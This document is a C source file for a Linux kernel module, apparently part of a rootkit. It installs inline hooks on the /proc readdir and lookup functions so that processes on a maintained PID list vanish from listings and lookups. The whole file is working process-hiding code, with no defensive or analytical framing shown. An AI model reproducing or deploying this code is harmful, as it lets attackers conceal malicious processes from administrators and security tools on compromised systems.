#include "hide_proc.h"
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/version.h>
#include <linux/proc_fs.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/list.h>
#include <linux/spinlock.h>
#include <linux/namei.h>
#include <linux/kallsyms.h>
#include <linux/dirent.h>
#include <linux/vmalloc.h>
#include <linux/dcache.h>

#include "inline_hook/p_lkrg_main.h"

#if defined(CONFIG_ARM64)
static inline unsigned long p_inline_regs_get_arg2(hk_regs *p_regs) {
   return p_regs->regs[1];
}
static inline void p_inline_regs_set_arg2(hk_regs *p_regs, unsigned long p_val) {
   p_regs->regs[1]=p_val;
}
#endif

// --- PID list management (unchanged) ---
struct hidden_pid_entry {
    struct list_head list;
    pid_t pid;
};

static LIST_HEAD(hidden_pids);
static DEFINE_SPINLOCK(hidden_lock);

bool is_pid_hidden(pid_t pid) {
    struct hidden_pid_entry *entry;
    bool found = false;

    spin_lock(&hidden_lock);
    list_for_each_entry(entry, &hidden_pids, list) {
        if (entry->pid == pid) {
            found = true;
            break;
        }
    }
    spin_unlock(&hidden_lock);

    return found;
}

void add_hidden_pid(pid_t pid) {
    struct hidden_pid_entry *new_entry;

    if (is_pid_hidden(pid))
        return;

    new_entry = kmalloc(sizeof(struct hidden_pid_entry), GFP_KERNEL);
    if (!new_entry)
        return;

    new_entry->pid = pid;

    spin_lock(&hidden_lock);
    list_add(&new_entry->list, &hidden_pids);
    spin_unlock(&hidden_lock);

    printk(KERN_INFO "[hide_proc] Added PID %d to hidden list\n", pid);
}

void remove_hidden_pid(pid_t pid) {
    struct hidden_pid_entry *entry, *tmp;

    spin_lock(&hidden_lock);
    list_for_each_entry_safe(entry, tmp, &hidden_pids, list) {
        if (entry->pid == pid) {
            list_del(&entry->list);
            kfree(entry);
            printk(KERN_INFO "[hide_proc] Removed PID %d from hidden list\n", pid);
            break;
        }
    }
    spin_unlock(&hidden_lock);
}

void clear_hidden_pids(void) {
    struct hidden_pid_entry *entry, *tmp;

    spin_lock(&hidden_lock);
    list_for_each_entry_safe(entry, tmp, &hidden_pids, list) {
        list_del(&entry->list);
        kfree(entry);
    }
    spin_unlock(&hidden_lock);

    printk(KERN_INFO "[hide_proc] Cleared all hidden PIDs\n");
}

// --- Inline hook implementation ---

// Forward declarations
int proc_readdir_entry(unsigned long ret_addr, hk_regs *regs);
int proc_readdir_ret(unsigned long ret_addr, hk_regs *regs);
int proc_lookup_ret(unsigned long ret_addr, hk_regs *regs);

// Hook state
static char proc_readdir_hook_state = 0;
static char proc_lookup_hook_state = 0;

// Hook structures (name removed, will use target_addr)
static struct p_hook_struct proc_readdir_hook = {
    .entry_fn = proc_readdir_entry,
    .ret_fn = proc_readdir_ret,
};

// Dummy entry function to prevent crash
int proc_lookup_entry(unsigned long ret_addr, hk_regs *regs) {
    return 0;
}

static struct p_hook_struct proc_lookup_hook = {
    .entry_fn = proc_lookup_entry,
    .ret_fn = proc_lookup_ret,
};

#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0)
struct hooked_dir_context {
    struct dir_context original;
    struct dir_context *original_ctx;
};

static int hooked_filldir(struct dir_context *ctx, const char *name, int namlen,
                          loff_t offset, u64 ino, unsigned int d_type) {
    struct hooked_dir_context *hooked_ctx = container_of(ctx, struct hooked_dir_context, original);
    char *endptr;
    long pid;

    pid = simple_strtol(name, &endptr, 10);
    if (*endptr == '\0' && is_pid_hidden((pid_t)pid)) {
        return 0;
    }

    return hooked_ctx->original_ctx->actor(hooked_ctx->original_ctx, name, namlen, offset, ino, d_type);
}

int proc_readdir_entry(unsigned long ret_addr, hk_regs *regs) {
    struct dir_context *original_ctx = (struct dir_context *)p_inline_regs_get_arg2(regs);
    struct hooked_dir_context *hooked_ctx;

    if (!original_ctx || !original_ctx->actor) {
        regs->regs[19] = (unsigned long)NULL;
        return 0;
    }

    hooked_ctx = kmalloc(sizeof(*hooked_ctx), GFP_ATOMIC);
    if (!hooked_ctx) {
        regs->regs[19] = (unsigned long)NULL;
        return 0;
    }

    // Initialize by copying, then overwrite the const actor via a pointer cast
    memcpy(&hooked_ctx->original, original_ctx, sizeof(struct dir_context));
    *(filldir_t *)(&hooked_ctx->original.actor) = hooked_filldir;
    hooked_ctx->original_ctx = original_ctx;

    p_inline_regs_set_arg2(regs, (unsigned long)&hooked_ctx->original);

    regs->regs[19] = (unsigned long)hooked_ctx;

    return 0;
}

int proc_readdir_ret(unsigned long ret_addr, hk_regs *regs) {
    struct hooked_dir_context *hooked_ctx = (struct hooked_dir_context *)regs->regs[19];

    if (hooked_ctx) {
        hooked_ctx->original_ctx->pos = hooked_ctx->original.pos;
        kfree(hooked_ctx);
    }

    return 0;
}
#else
// Dummy functions for older kernels
int proc_readdir_entry(unsigned long ret_addr, hk_regs *regs) { return 0; }
int proc_readdir_ret(unsigned long ret_addr, hk_regs *regs) { return 0; }
#endif

int proc_lookup_ret(unsigned long ret_addr, hk_regs *regs) {
    struct dentry *dentry_arg = (struct dentry *)p_inline_regs_get_arg2(regs);
    struct dentry *result_dentry = (struct dentry *)regs->regs[0];
    const char *name;
    char *endptr;
    long pid;

    if (!result_dentry || IS_ERR(result_dentry)) {
        return 0;
    }

    if (!dentry_arg || !dentry_arg->d_name.name) {
        return 0;
    }

    name = dentry_arg->d_name.name;
    pid = simple_strtol(name, &endptr, 10);

    if (*endptr == '\0' && is_pid_hidden((pid_t)pid)) {
        dput(result_dentry);
        regs->regs[0] = (unsigned long)NULL;
    }

    return 0;
}

int hide_proc_init(void) {
    struct path proc_path;
    struct inode *proc_inode;
    void *readdir_ptr = NULL;
    void *lookup_ptr = NULL;
    int ret;

    printk(KERN_INFO "[hide_proc] Initializing process hiding (inline hook, dynamic address)\n");

    ret = kern_path("/proc", LOOKUP_FOLLOW, &proc_path);
    if (ret) {
        printk(KERN_ERR "[hide_proc] Failed to get /proc path: %d\n", ret);
        return ret;
    }

    proc_inode = proc_path.dentry->d_inode;
    if (!proc_inode || !proc_inode->i_fop || !proc_inode->i_op) {
        printk(KERN_ERR "[hide_proc] Failed to get /proc inode operations\n");
        path_put(&proc_path);
        return -ENOENT;
    }

#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0)
    readdir_ptr = (void *)proc_inode->i_fop->iterate_shared;
    if (!readdir_ptr) {
        readdir_ptr = (void *)proc_inode->i_fop->iterate;
    }
#else
    readdir_ptr = (void *)proc_inode->i_fop->readdir;
#endif
    lookup_ptr = (void *)proc_inode->i_op->lookup;

    path_put(&proc_path);

    if (!readdir_ptr || !lookup_ptr) {
        printk(KERN_ERR "[hide_proc] Failed to find readdir/lookup function pointers.\n");
        return -ENOENT;
    }

    proc_readdir_hook.target_addr = readdir_ptr;
    proc_lookup_hook.target_addr = lookup_ptr;

    ret = p_install_hook(&proc_readdir_hook, &proc_readdir_hook_state, 0);
    if (ret) {
        printk(KERN_ERR "[hide_proc] Failed to hook readdir function at %p\n", readdir_ptr);
        return ret;
    }

    ret = p_install_hook(&proc_lookup_hook, &proc_lookup_hook_state, 0);
    if (ret) {
        printk(KERN_ERR "[hide_proc] Failed to hook lookup function at %p\n", lookup_ptr);
        p_uninstall_hook(&proc_readdir_hook, &proc_readdir_hook_state);
        return ret;
    }

    return 0;
}

void hide_proc_exit(void) {
    printk(KERN_INFO "[hide_proc] Exiting process hiding (inline hook)\n");
    p_uninstall_hook(&proc_readdir_hook, &proc_readdir_hook_state);
    p_uninstall_hook(&proc_lookup_hook, &proc_lookup_hook_state);
    clear_hidden_pids();
}
